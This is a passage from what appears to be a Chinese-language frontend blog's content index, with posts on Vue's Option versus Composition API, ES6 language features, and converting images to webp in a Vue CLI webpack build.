done:false }) this.val = \u0026#39;\u0026#39; } } } \u0026lt;/script\u0026gt; Option Api 的缺陷 反覆橫跳 隨著業務複雜度越來越高，代碼量會不斷的加大；由於相關業務的代碼需要遵循 option 的配置寫到特定的區域，導致後續維護非常的複雜，代碼可複用性也不高。\n相信大部分同學都維護過超過200行的 .vue 組件，新增或者修改一個需求，就需要分別在 data、methods、computed 裡修改，滾動條反复上下移動，我稱之為『反复橫跳』，比如我們簡單的加個拍腦門的需求加個累加器，這種寫代碼上下反复橫條的感覺，相信大家都懂的： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;h1 @click=\u0026#34;add\u0026#34;\u0026gt;LSP {{count}}号 double is{{double}}\u0026lt;/h1\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;val\u0026#34; @keyup.enter=\u0026#34;addTodo\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; :key=\u0026#34;todo.id\u0026#34;\u0026gt;{{todo.title}}\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import Counter from \u0026#39;./counter\u0026#39; export default { mixins:[Counter], data(){ return{ count:1, val:\u0026#39;\u0026#39;, todos:[ {id:0, title:\u0026#39;吃饭\u0026#39;, done:false}, {id:1, title:\u0026#39;睡觉\u0026#39;, done:false}, {id:2, title:\u0026#39;lsp\u0026#39;, done:false}, ] } }, computed: { double() { return this.count * 2 } }, methods:{ addTodo(){ this.todos.push({ id:this.todos.length, title:this.val, done:false }) this.val = \u0026#39;\u0026#39; }, add(){ this.count++ } } } \u0026lt;/script\u0026gt; mixin 和 this 反覆橫跳的本質，在於功能的分塊組織，以及代碼量太大了，如果我們能把代碼控制在一屏，自然就解決了，vue2 裡的解決方案，是使用 mixin 來混合, 我們抽離一個 counter.js： counter.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 export default { data() { return { count:1 } }, computed: { double() { return this.count * 2 } }, methods:{ add(){ this.count++ } } } App.vue 1 2 3 4 5 6 7 8 import Counter from \u0026#39;./counter\u0026#39; export default { mixins:[Counter], data(){ ... }, ... } 這樣確實拆分了代碼，但是有一個很嚴重的問題，就是不打開 counter.js，App.vue 裡的 this 上，count、add這些屬性，是完全不知道從哪來的，你不知道是 mixin，還是全局 install，還是 Vue.prototype.count 設置的，數據來源完全模糊，調試爽死你，這也是 option 的一個大問題，this 是個黑盒，template 裡寫的 count 和 double，完全不知道從哪來的。\n如果有兩個 mixin，就更有意思了，比如我們又有一個需求，實時顯示鼠標的坐標位置 x，並且有一個乘以 2 的計算屬性湊巧也叫 double，再整一個 mixin：\nuseMouse.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 export default { data() { return { x:0 } }, methods:{ update(e){ this.x = e.pageX } }, computed:{ double(){ return this.x*2 } }, mounted(){ window.addEventListener(\u0026#39;mousemove\u0026#39;, this.update) }, destroyed(){ window.removeEventListener(\u0026#39;mousemove\u0026#39;, this.update) } } 這是一個獨立維護的 mixin，可能在 N 個地方用到，他根本不知道會不會有人和他衝突，然後用一下：\nApp.vue 1 2 3 4 5 6 import Counter from \u0026#39;./counter\u0026#39; import Mouse from \u0026#39;./mouse\u0026#39; export default { mixins:[Counter,Mouse], ...... } 兩個 mixin 裡都有 double 這個數，尷尬，看效果，lsp 的 count 被覆蓋了很尷尬，而且在 App.vue 這裡，你完全不知道這個 double 到底是哪個，調試很痛苦。\nComposition Api composition 就是為了解決這個問題存在的，通過組合的方式，把零散在各個 data、methods 的代碼重新組合，一個功能的代碼都放在一起維護，並且這些代碼可以單獨拆分成函數，顯然我們可以更加優雅的組織我們的代碼，函數。讓相關功能的代碼更加有序的組織在一起。\n我們用vue3演示一下功能，具體api就不解釋了直接vue3文檔搞起就可以：\nApp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;val\u0026#34; @keyup.enter=\u0026#34;addTodo\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; :key=\u0026#34;todo.id\u0026#34;\u0026gt;{{todo.title}}\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { reactive, ref, toRefs } from \u0026#39;vue\u0026#39; export default { setup(){ let val = ref(\u0026#39;\u0026#39;) let todos = reactive([ { id:0, title:\u0026#39;吃饭\u0026#39;, done:false }, { id:1, title:\u0026#39;睡觉\u0026#39;, done:false }, { id:2, title:\u0026#39;lsp\u0026#39;, done:false }, ]) function addTodo(){ todos.push({ id: todos.length, title: val.value, done: false }) val.value = \u0026#39;\u0026#39; } return {val, todos, addTodo} } } \u0026lt;/script\u0026gt; 利用函數我們可以把功能完整獨立的拆分成模塊或者函數，方便組織代碼，並且解決了 mixin 混亂的問題。\n比如我們的累加器，抽離一個counter.js：\ncounter.js 1 2 3 4 5 6 7 8 9 10 import { ref, computed } from \u0026#39;vue\u0026#39; export default function useCounter(){ let count = ref(1) function add(){ count.value++ } let double = computed(()=\u0026gt;count.value*2) return { count, double, add } } 直接使用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 import { reactive, ref, toRefs } from \u0026#39;vue\u0026#39; + import useCounter from \u0026#39;./counter\u0026#39; export default { setup(){ let val = ref(\u0026#39;\u0026#39;) ... + let { count,double,add } = useCounter() return { val, todos, addTodo, + count, double, add } } } 再來一個鼠標位置也不在話下，而且可以很好地利用解構賦值的別名，解決 mixin 的命名衝突問題：\nuseMouse.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import { ref, onMounted, onUnmounted, computed } from \u0026#39;vue\u0026#39; export default function useMouse(){ let x = ref(0) function update(e){ x.value = e.pageX } let double = computed(()=\u0026gt;x.value*2) onMounted(()=\u0026gt;{ window.addEventListener(\u0026#39;mousemove\u0026#39;, update) }) onUnmounted(()=\u0026gt;{ window.removeEventListener(\u0026#39;mousemove\u0026#39;, update) }) return { x, double } } 模板裡直接用 doubelX：\n1 2 3 4 5 6 7 let { count, double, add } = useCounter() let { x, double:doubleX } = useMouse() return { val, todos, addTodo, count, double, add, x, doubleX } script setup 不過有的同學可能，還有一個小小的吐槽，那就是 setup 函數最後的 return 也是集中的，如果行數太多，一樣會橫條一下下。\n這個好解決，因為本身我們可以把 todos 也抽離成函數，這樣 setup 就全部是數據的來源，非常精簡絲滑：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import useCounter from \u0026#39;./counter\u0026#39; import useMouse from \u0026#39;./mouse\u0026#39; import useTodo from \u0026#39;./todos\u0026#39; export default { setup(){ let { val, todos, addTodo } = useTodo() let { count, double, add } = useCounter() let { x, double:doubleX } = useMouse() return { val, todos, addTodo, count, double, add, x, doubleX } } } 是不是賊爽呢，如果有些同學就是不想啥都抽離，還是覺得統一 return 很麻煩， 我們可以使用 vue3 的 setup script 功能，把 setup 這個配置也優化掉一個功能 export 一次：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script setup\u0026gt; import useCounter from \u0026#39;./counter\u0026#39; import useMouse from \u0026#39;./mouse\u0026#39; import useTodo from \u0026#39;./todos\u0026#39; let { val, todos, addTodo } = useTodo() export { val, todos, addTodo } let { count, double, add } = useCounter() export { count, double, add } let { x, double:doubleX } = useMouse() export { x, doubleX } \u0026lt;/script\u0026gt; 具體看這裡\n","date":"2022-08-11T00:00:00Z","image":"https://live.staticflickr.com/65535/52277524312_b6dc5e213c_o.png","permalink":"https://wayneblog.ga/2022-08-11/option-api-vs-composition-api/","title":"圖解 Option API vs Composition API"},{"content":" 【尚硅谷】ES6教程 - 涵盖 ES6~ES11\n給進入 Vue.js 前的 ES6 必備知識\n超级实用的 ES6 特性\n【詳細 MDN 文件】\nECMAScript ES 是 ECMAScript 的簡稱，ECMAScript 是腳本語言的規範。而我們所使用的 JavaScript 是 ECMAScript 的一種實現。 簡言之：ECMA做出規範，各瀏覽器依照規範做出實現，因而不同瀏覽器會有兼容性不同的情況。 ES6 是 ES 的經典版本，是前端工程師崗位的高頻需求，是前端開發工程師求職的必備技能。 現階段前端行業發展迅猛，前端技術也在高速迭代， ES6-ES11 規范增加了很多 JavaScript 新特性。 ES 新特性已經成為前端技術發展的趨勢，語法簡潔，功能豐富，部分特性還有性能提升，前端開發三大框架 Vue、React、Angular 都用到了大量的新特性代碼，框架的升級也在向著新特性語法靠攏。 var 、 let 與 const var 、 let 與 const 在 Javascript 都是用來宣告變數的語法，最大的差別是他們的scope(變數有效範圍)的不同。切分var作用範圍的最小單位為 function，而 let 與 const 的作用範圍是 block 也就是俗稱的大括號：{ } 來切分。 const 所宣告的變數還有另一個特性是無法被重新賦值 (re-assign)。 let 特性 var 可以重複聲明，但 let 不能重複聲明。 演示： 1 2 3 4 5 var testA = \u0026#34;AAA\u0026#34;; var testA = \u0026#34;BBB\u0026#34;; // 不會報錯 let testB = \u0026#34;AAA\u0026#34;; let testB = \u0026#34;BBB\u0026#34;; // 會報錯 let 為塊級作用域 塊級作用域：變數只在代碼塊裡面有效({ ... }、if else、while、for) 在 ES5 中，作用域有：全局、函數、eval(嚴格模式下) 演示： 1 2 3 4 5 6 7 8 9 { var b = \u0026#34;BBB\u0026#34;; } console.log(b); // \u0026#34;BBB\u0026#34;，因為 var 非塊級作用域，所以聲明時會往外層(全局window)添加這個屬性 { let a = \u0026#34;AAA\u0026#34;; } console.log(a); // 會報錯 a is not defined 不存在變數提升 變數提升：代碼執行前會先進行變數搜集，var 聲明的變量在搜集時會先定義一個 undefined 的初始值。 演示： 1 2 3 4 5 6 7 // 在 a 用 var 聲明前輸出 console.log(a); // 不會報錯，會輸出 undefined var a = \u0026#34;AAA\u0026#34;; // 在 b 用 let 聲明前輸出 console.log(b); // 會報錯，Cannot access \u0026#39;b\u0026#39; before initialization let b = \u0026#34;BBB\u0026#34;; 不影響作用域鏈 演示： 1 2 3 4 5 6 7 { let school = \u0026#34;尚硅谷\u0026#34;; function fn() { console.log(school); } fn(); // 輸出 \u0026#34;尚硅谷\u0026#34;，在 fn 內沒有 school，會往外層尋找 } let 經典範例實踐 實作點擊 div 時切換顏色 代碼： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;page-header\u0026#34;\u0026gt; 點擊切換顏色 \u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; // 獲取 div 元素對象 let items = document.getElementsByClassName(\u0026#34;item\u0026#34;); // 遍歷並綁定事件 for (var i = 0; i\u0026lt; items.length; i++) { item[i].onclick = function() { // 修改當前元素的背景顏色 // 最佳寫法應為： this.style.background = \u0026#34;pink\u0026#34;; // 常見錯誤寫法： // items[i].style.background = \u0026#34;pink\u0026#34;; // // 原因： // i 使用 var 來聲明，var 聲明的變數非塊級作用域， // 因此 i 被聲明在全局(window)，此處取 i 會發現 window.i 已經等於 3 // 所以 items[3].style 會找不到。 // // 修正方式： // 將 i 改用 let 來聲明，讓 i 只存在於 for 迴圈中。 } } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; const 特性 一定要賦初始值，且聲明後值不能被修改。 一般常數使用大寫(淺規則)。 也是塊級作用域 演示： 1 2 3 4 5 { const PLAYER = \u0026#34;UZI\u0026#34;; } console.log(PLAYER); // 會報錯，PLAYER is not defined 對於 Array 和 Object 的元素修改，不算對常數的修改，不會報錯。 演示： 1 2 3 4 { const TEAM = [\u0026#34;UZI\u0026#34;, \u0026#34;MXLG\u0026#34;, \u0026#34;Ming\u0026#34;, \u0026#34;Letme\u0026#34;]; TEAM.push(\u0026#34;Meiko\u0026#34;); // 不會報錯，因為變數所指向的地址沒有改變 } 函式的參數默認值 在 ES5 中必須這麼寫： 1 2 3 4 function printText(text) { text = text || \u0026#34;default\u0026#34;; console.log(text); } 在 ES6 以後可以這樣簡寫屬性： 1 2 3 function printText(text = \u0026#34;default\u0026#34;) { console.log(text); } 二進制與八進制字面量 ES6 支持二進制與八進制的字面量，通過在數字前面添加 0o 或者 0O 即可將其轉換為八進制值、添加 0b 或者 0B 即可將其轉換為二進制值。 1 2 3 4 5 6 7 let oValue = \u0026#34;0o10\u0026#34;; console.log(oValue); // \u0026gt;\u0026gt;\u0026gt; 8 let bValue = 0b10; console.log(bValue); // \u0026gt;\u0026gt;\u0026gt; 2 ES Module 與 import 、 export Javascript 自從 ES6 開始新增了模組系統(ES Module)，我們可以將每個 Javascript 的檔案當作是一個獨立的模組來看待，在 A 檔案匯出(export)在 B 檔案匯入(import)。 a.js 1 2 3 4 5 6 7 export const aString = \u0026#34;This is A String\u0026#34;; export function aFunction() { console.log(\u0026#34;A Function test\u0026#34;) } export const aObject = { a: 1 }; b.js 1 2 3 4 5 6 7 8 9 10 import { aString, aFunction, aObject } from \u0026#34;./a.js\u0026#34;; console.log(aString); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;This is A String\u0026#34; console.log(aObject); // \u0026gt;\u0026gt;\u0026gt; { a: 1 } aFounction(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;A Function test\u0026#34; 當然在 export 也可以不用給變數名稱： c.js 1 2 3 export default function() { console.log(\u0026#34;Hello 008 JS!!!\u0026#34;); } 在另一個檔案就可以這樣來使用： d.js 1 2 3 4 import greeting from \u0026#34;./c.js\u0026#34;; greeting(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Hello 008 JS!!!\u0026#34; 箭頭函數與 this 從 ES6 開始新增了一種叫做 「箭頭函式表示式」 (Arrow Function expression) 的函式表達式。快速看一下，如何將一般的函式轉換成箭頭函式的寫法： 1 2 3 const plus = function(numA, numB) { return numA + numB; }; 首先我們把參數往前提，然後把關鍵字 function 刪掉改成箭頭符號 =\u0026gt;： 1 2 3 const plus = (numA, numB) =\u0026gt; { return numA + numB; }; 如果這個函式只是想要回傳某個運算結果的時候，可以將 return 以及大括號 { } 省略： 1 const plus = (numA, numB) =\u0026gt; numA + numB; 而只有一個參數的時候，參數前面的小括號( )則可以省略： 1 2 3 4 const saySomething = msg =\u0026gt; console.log(msg); saySomething(\u0026#34;Hello!\u0026#34;); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Hello!\u0026#34; 另外需要注意的是，在箭頭函式使用 this 時，這時 this 會指向箭頭函式外面的 this，這個規則與原本 function 所宣告的函式不同，而且箭頭函式無法透過 bind() 強制指定裡面的 this。 字串模板 (Template literals) 以往我們在組合 JavaScript 的變數與 HTML 模板的時候，大多會透過「字串結合」 + 的模式，或透過陣列來新增字串，最後再用 [].join(\u0026quot;\u0026quot;) 的方式串接起來。但自 ES6 起，我們可以透過字串模板的語法，將變數、運算式等插入至我們的網頁模板當中，像這樣： 1 2 // 用「`...`」取代單/雙引號 `string text ${expression} string text` 這樣我們就可以將這個 expression 所代表的運算式或數值置入到字串裡頭了。 解構賦值 (Destructuring assignment) ES6 提供了解構賦值的語法，可以將陣列或者物件裡面的資料解開變成獨立的變數： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 const user = { id: 42, displayName: \u0026#34;jdoe\u0026#34;, fullName: { firstName: \u0026#34;John\u0026#34;, lastName: \u0026#34;Doe\u0026#34; } }; const { id, displayName, fullName } = user; console.log(id); // \u0026gt;\u0026gt;\u0026gt; 42 console.log(displayName); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;jdoe\u0026#34; console.log(fullName); // \u0026gt;\u0026gt;\u0026gt; { firstName: \u0026#34;John\u0026#34;, lastName: \u0026#34;Doe\u0026#34; } 除了物件以外，陣列也可以： 1 2 3 4 5 6 7 8 9 const number = [1, 2, 3, 4, 5]; const [x, y] = number; console.log(x); // \u0026gt;\u0026gt;\u0026gt; 1 console.log(y); // \u0026gt;\u0026gt;\u0026gt; 2 ... 展開運算子 (Spread Operator) / 其餘運算子 (Rest Operator) 雖然 ES6 提供的展開運算子與其餘運算子的語法都是 ...，不過它們兩者所代表的涵意還是不太一樣。 展開運算子 展開運算子通常會用在陣列，或者是函式的參數，如： 1 2 3 4 5 const frameworks = [\u0026#34;Vue.js\u0026#34;, \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34;]; const arr = [\u0026#34;Awesome\u0026#34;, ...frameworks]; console.log(arr); // \u0026gt;\u0026gt;\u0026gt; [\u0026#34;Awesome\u0026#34;, \u0026#34;Vue.js\u0026#34;, \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34;] 其餘運算子 延續前面的例子，我們可以透過 「其餘運算子」 將剩下的部分拆解出來： 1 2 3 4 5 6 7 8 9 10 11 12 13 console.log(arr); // \u0026gt;\u0026gt;\u0026gt; [\u0026#34;Awesome\u0026#34;, \u0026#34;Vue.js\u0026#34;, \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34;] const [a, b, ...others] = arr; console.log(a); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Awesome\u0026#34; console.log(b); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Vue.js\u0026#34; console.log(others); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34; 像這樣，我們可以搭配解構賦值的語法，將 arr 陣列拆解處來，並將剩餘的元素透過 ...others 分離。 當然，使用在物件上也是可以的： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // 其餘 Properties const { x, y, ...z } = { x: 1, y: 2, a: 3, b: 4 }; console.log(x); // \u0026gt;\u0026gt;\u0026gt; 1 console.log(y); // \u0026gt;\u0026gt;\u0026gt; 2 console.log(z); // \u0026gt;\u0026gt;\u0026gt; { a: 3, b: 4 } // 展開 Properties const obj = { x, y, ...z }; console.log(obj); // \u0026gt;\u0026gt;\u0026gt; { x: 1, y: 2, a: 3, b: 4 } 要注意的是，其餘運算子所分離的部分只是陣列或物件的「淺拷貝」，若在多層物件使用時要特別小心。 Promise 物件 為了解決過去同步與非同步的問題，ES6 提供了 Promise 物件： 1 2 3 4 const myPromiseFunc = new Promise((resolve, reject) =\u0026gt; { resolve(someValue); // 完成 // reject(\u0026#34;failure reason\u0026#34;); // 拒絕 }); 當 Promise 的任務被完成的時候，我們就可以呼叫 resolve()，然後將取得的資料傳遞出去。 或是說想要拒絕這個 Promise，那麼就裡面呼叫 reject() 來拒絕他。 1 2 3 4 5 6 7 8 9 function myAsyncFunction(url) { return new Promise((resolve, reject) =\u0026gt; { // resolve() or reject() }); } // 透過 .then() 來取代過去的 callback hell myAsyncFunction(...) .then(() =\u0026gt; { ... }); async 與 await 在後來，從 Promise 物件又延伸出 async 與 await 兩個新特性，其實本質上是更簡便的語法糖。 假設我們有兩個非同步任務要處理，並且我們希望在 asyncFunc1 執行完成之後才去執行 asyncFunc2： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function asyncFunc1(url) { return new Promise((resolve, reject) =\u0026gt; { // resolve() or reject() }); } function asyncFunc2(url) { return new Promise((resolve, reject) =\u0026gt; { // resolve() or reject() }); } const asyncCall = async() =\u0026gt; { const result1 = await asyncFunc1(); const result2 = await asyncFunc2(); }; 像這樣，透過 async 與 await 我們就可以擺脫過去一層層 callback 的惡夢，程式碼也更加簡潔。\n簡寫屬性 在 ES5 中必須這麼寫： 1 2 3 4 5 6 function createCoord(x, y) { return { x: x, y: y } } 在 ES6 以後可以這樣簡寫屬性： 1 2 3 4 5 6 function createCoord(x, y) { return { x, y } } 方法屬性 在 ES5 中必須這麼寫： 1 2 3 4 5 const math = { add: function(a, b) { return a + b; }, sub: function(a, b) { return a - b; }, multiply: function(a, b) { return a * b; } } 在 ES6 以後可以這樣簡寫屬性： 1 2 3 4 5 const math = { add(a, b) { return a + b; }, sub(a, b) { return a - b; }, multiply(a, b) { return a * b; } } 陣列方法 ES6 引入了許多有用的陣列方法，例如： find()：查找陣列中的成員，返回 null 表示沒找到 findIndex()：查找陣列成員的索引 some()：檢查某個斷言是否至少一個成員在陣列中 includes：陣列是否包含某項目 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const array = [{ id: 1, checked: true }, { id: 2 }]; arr.find(item =\u0026gt; item.id === 2) // \u0026gt;\u0026gt;\u0026gt; { id: 2 } arr.findIndex(item =\u0026gt; item.id === 2) // \u0026gt;\u0026gt;\u0026gt; 1 arr.some(item =\u0026gt; item.checked) // \u0026gt;\u0026gt;\u0026gt; true const numberArray = [1,2,3,4]; numberArray.includes(2); // \u0026gt;\u0026gt;\u0026gt; true ES6 的 class ES6 支持 class 語法，但不是新的對象繼承模型，只是原型鍊的語法糖。 函式中使用 static 關鍵字定義構造函式的方法與屬性： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class Student { constructor() { console.log(\u0026#34;I\u0026#39;m a student.\u0026#34;); } study() { console.log(\u0026#34;study!\u0026#34;); } static read() { console.log(\u0026#34;Reading Now.\u0026#34;); } } console.log(typeof Student); // \u0026gt;\u0026gt;\u0026gt; Function let stu = new Student(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;I\u0026#39;m a student.\u0026#34; stu.study(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;study!\u0026#34; stu.read(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Reading Now.\u0026#34; class 的繼承(extends) extends 允許一個子類繼承父類，需要注意的是，子類的 constructor 函式中需要執行 supre() 函式。 當然你也可以在子類方法中調用父類的方法，如 supre.parentMethodName()。 class 的聲明不會提升 hoisting ，如果你要使用某個 class ，那你必須在使用之前定義他，否則會拋出 reference error 的錯誤。 在 class 中定義函式不需要使用 function 關鍵字。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Phone { constructor() { console.log(\u0026#34;I\u0026#39;m a phone.\u0026#34;); } } class MI extends Phone { constructor() { supre(); console.log(\u0026#34;I\u0026#39;m a phone designed by xiaomi.\u0026#34;); } } let mi8 = new MI(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;I\u0026#39;m a phone.\u0026#34; // \u0026gt;\u0026gt;\u0026gt; \u0026#34;I\u0026#39;m a phone designed by xiaomi.\u0026#34; class 的 super 方法 super 關鍵字被使用於通過函式存取父層 【詳細 MDN 文件】\n語法 1 2 super([arguments]); // calls the parent constructor. super.functionOnParent([arguments]); 當使用建構子，super 關鍵字必須出現在 this 關鍵字之前使用，super 關鍵字也可以使用在呼叫函式與父對象。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 let parent = { foo() { console.log(\u0026#34;Hello from the Parent\u0026#34;); } } let child = { foo() { super.foo(); console.log(\u0026#34;Hello from the Child\u0026#34;); } } Object.setPrototypeOf(child, parent); child.foo(); // \u0026gt;\u0026gt;\u0026gt; Hello from the Parent // \u0026gt;\u0026gt;\u0026gt; Hello from the Child 非同步處理工具 - Generator(生成器函式) 生成器函式 生成器對像是由一個 generator function 返回的,並且它符合可迭代協議和迭代器協議。 【詳細 MDN 文件】\n語法 1 2 3 4 5 6 7 8 function* gen() { yield 1; yield 2; yield 3; } let g = gen(); // \u0026#34;Generator { }\u0026#34; 方法 Generator.prototype.next()：返回一個由 yield表達式生成的值。 Generator.prototype.return()：返回給定的值並結束生成器。 Generator.prototype.throw()：向生成器拋出一個錯誤。 範例：一個無限迭代器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function* idMaker() { let index = 0; while(true) yield index++; } let gen = idMaker(); // \u0026#34;Generator { }\u0026#34; console.log(gen.next().value); // \u0026gt;\u0026gt;\u0026gt; 0 console.log(gen.next().value); // \u0026gt;\u0026gt;\u0026gt; 1 console.log(gen.next().value); // \u0026gt;\u0026gt;\u0026gt; 2 // ... 生成器對象 Generator.prototype.next()：返回 yield 表達式生成的值。 Generator.prototype.close()：關閉生成器，因此執行該函式後調用next()方法時將會拋出 StopIteration 錯誤。 Generator.prototype.send()：用於將值發送到生成器。該值由yield表達式返回，並且返回下一個yield表達式生成的值。 Generator.prototype.throw()：向生成器拋出錯誤。 ","date":"2022-08-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52276889089_0bb5aa46f7_o.png","permalink":"https://wayneblog.ga/2022-08-10/javascript-es6/","title":"Javascript ES6 特性"},{"content":" 參考網站\nVue CLI 官方webpack相關文檔\n前言 webp 是 2010年 Google 釋出的圖片格式，針對 PNG 可減少 26%，JPEG 約可減少 25% ~ 34%，目前僅 safari、IE 尚不支援，但 safari 在 ios 14 以後開始支援。 若在未提供 .webp 格式圖檔的情況下，使用套件於 webpack 時進行圖片轉檔，但於 development 下會因抓不到虛擬的 XXX.webp 圖檔而導致 npm run 起時噴錯，可使用以下設定解決此問題。 使用 webpack-plugin-image-transform-webp-and-mini 套件將 image 轉檔成 webp 格式 1 npm i webpack-plugin-image-transform-webp-and-mini 新增一個自訂的 webploader 此 loader 功用為：若 resource 的 query (使用 chainWebpack 提供的變數\u0026quot;resourceQuery\u0026ldquo;抓) 字符中含有 \u0026quot;type=webp\u0026quot; 且 resource 為圖片時，將附檔名轉換成 XXX.webp 。 1 2 3 4 5 6 7 8 9 10 11 12 const path = require(\u0026#34;path\u0026#34;) module.exports = function(source, map) { let result = source if (this.resourceQuery \u0026amp;\u0026amp; this.resourceQuery.includes(\u0026#34;type=webp\u0026#34;) \u0026amp;\u0026amp; !this.resource.includes(\u0026#34;data:image\u0026#34;)) { let extname = path.extname(this.resourcePath) result = source.replace(extname, \u0026#34;.webp\u0026#34;) } // return result this.callback(null, result, map) } chainWebpack 設定 套件安裝完成後，vue.config.js 引入套件，並指定webp圖檔存放位置。 引入自訂的 webploader ， 並設定 chainWebpack 的 images 需優先跑 webploader，再跑 url-loader 與 file-loader。 主要解決 Vue-cli 的 development 下，會因實際不存在 \u0026ldquo;XXX.webp\u0026rdquo; 圖檔而導致開發時報錯的問題。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // ... const ImageminWebpWebpackPlugin = require(\u0026#34;webpack-plugin-image-transform-webp-and-mini\u0026#34;) // ... chainWebpack: config =\u0026gt; { // ... config.plugins.delete(\u0026#34;preload-index\u0026#34;) config.plugins.delete(\u0026#34;prefetch-index\u0026#34;) // 相關設定建議放於移除 preload-index 與 prefetch-index 之後 config.plugin(\u0026#34;webP\u0026#34;).use(ImageminWebpWebpackPlugin, [ { name: \u0026#34;static/img/[name].[hash:8].[ext]\u0026#34;, logger: false, paths: { dir: path.resolve(__dirname, \u0026#34;./src/assets\u0026#34;), exclude: [] }, miniOptions: false } ]) let rule = config.module.rule(\u0026#34;images\u0026#34;) rule.uses.clear() rule .use(\u0026#34;./webploader.js\u0026#34;) .loader(\u0026#34;./webploader.js\u0026#34;) .end() .use(\u0026#34;url-loader\u0026#34;) .loader(\u0026#34;url-loader\u0026#34;) .options({ limit: 4096, fallback: { loader: \u0026#34;file-loader\u0026#34;, options: { name: \u0026#34;static/img/[name].[hash:8].[ext]\u0026#34; } } }) // ... } 補上是否支援 Webp 的判斷，若支援則於 \u0026lt;html\u0026gt; 補上 class name，供CSS抓取 class name 後改讀 webp 圖片 main.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 async function isSupportWebp() { return new Promise(resolve =\u0026gt; { let result = false const elem = document.createElement(\u0026#34;canvas\u0026#34;) if (elem.getContext \u0026amp;\u0026amp; elem.getContext(\u0026#34;2d\u0026#34;)) { result = elem.toDataURL(\u0026#34;image/webp\u0026#34;).indexOf(\u0026#34;data:image/webp\u0026#34;) === 0 } resolve(result) }) } // 使用自定义过滤器 filter(Vue) ;(async () =\u0026gt; { Vue.prototype.$supportWebp = await isSupportWebp() if (Vue.prototype.$supportWebp) { document.documentElement.classList.add(\u0026#34;webp\u0026#34;) } })() 若有使用 vue-lazyload，則補上 vue-lazyload 提供的 webp 相關設定 \u0026lt;img\u0026gt; 使用 v-lazy 時，src的圖片附檔名皆會轉換成 XXX.webp 1 2 3 4 5 6 7 8 9 10 vue.use(VueLazyload, { filter: { webp(listener) { if (vue.prototype.$supportWebp \u0026amp;\u0026amp; !~listener.src.indexOf(\u0026#34;.webp\u0026#34;)) { listener.src = listener.src.replace(/\\.(png|jpe?g)(\\?.*)?$/, \u0026#34;.webp\u0026#34;) listener.el.setAttribute(\u0026#34;data-src\u0026#34;, listener.src.replace(/\\.(png|jpe?g)(\\?.*)?$/, \u0026#34;.webp\u0026#34;)) } } } }) 於各個 CSS 中，若 background 使用到需轉 .webp 格式的 img ，補上自行設定的 query (\u0026quot;?type=webp\u0026quot;)，以便 webploader 抓該 query 進行轉換圖檔格式 例如： 1 2 3 4 5 6 7 8 9 10 